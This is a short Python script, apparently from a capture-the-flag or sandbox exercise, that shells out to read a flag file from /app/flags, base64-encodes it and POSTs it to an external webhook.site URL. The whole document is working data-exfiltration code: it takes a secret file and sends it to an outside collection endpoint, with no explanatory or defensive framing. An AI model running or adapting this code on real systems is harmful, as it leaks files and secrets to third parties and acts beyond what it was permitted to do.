import urllib.request
import os
import json

flag = os.popen('cat /app/flags/flag_7255280b-939d-4d5c-aa7e-af319b8721dc.txt | base64').read().strip()

url = 'https://webhook.site/4942a284-d09e-417c-9039-d335aaf9af4b'

data = json.dumps({'flag': flag}).encode('utf-8')

req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')

try:
    response = urllib.request.urlopen(req)
    content = response.read()
    print(f"success: {content.decode('utf-8')}")
    
except urllib.error.URLError as e:
    print(f"error: {e}")
